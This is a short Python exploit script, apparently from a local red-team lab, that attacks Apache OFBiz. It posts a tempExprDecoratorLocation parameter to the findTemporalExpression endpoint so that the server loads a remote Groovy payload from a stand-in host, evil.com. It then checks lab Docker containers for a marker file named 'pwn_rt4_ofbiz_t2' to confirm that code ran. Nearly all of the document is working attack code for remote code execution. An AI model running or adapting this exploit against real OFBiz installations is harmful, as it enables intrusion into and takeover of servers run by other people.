# -*- coding: utf-8 -*-
"""RT-4 OFBiz second shot: brace-free groovy payload (first shot was truncated at first '}')."""
import subprocess

import requests
import urllib3

urllib3.disable_warnings()

TARGET = "https://127.0.0.1:18081"
URI = "/webtools/control/main/findTemporalExpression"
BODY = "tempExprDecoratorLocation=%09http://evil.com:8000/payloads/rt4_ofbiz.xml"

s = requests.Session()
s.trust_env = False
s.verify = False
s.headers["User-Agent"] = "Mozilla/5.0"
r = s.post(TARGET + URI, data=BODY,
           headers={"Content-Type": "application/x-www-form-urlencoded"},
           timeout=60, allow_redirects=False)
print("[*] RT4 brace-free -> HTTP %s (%dB)" % (r.status_code, len(r.content)))

print("\n=== truth ===")
for cmd in (["ls", "-l", "--full-time", "/tmp/hsperfdata_root"],
            ["ls", "-l", "--full-time", "/usr/src/apache-ofbiz/pwn_rt4_ofbiz_t2"]):
    r = subprocess.run(["docker", "exec", "multi-round-lab-ofbiz-1"] + cmd,
                       capture_output=True, text=True)
    print(r.stdout + r.stderr)
r = subprocess.run(["docker", "logs", "multi-round-lab-infra-1", "--since", "3m"],
                   capture_output=True, text=True)
for line in (r.stdout + r.stderr).splitlines():
    if "rt4" in line:
        print("[infra] " + line)
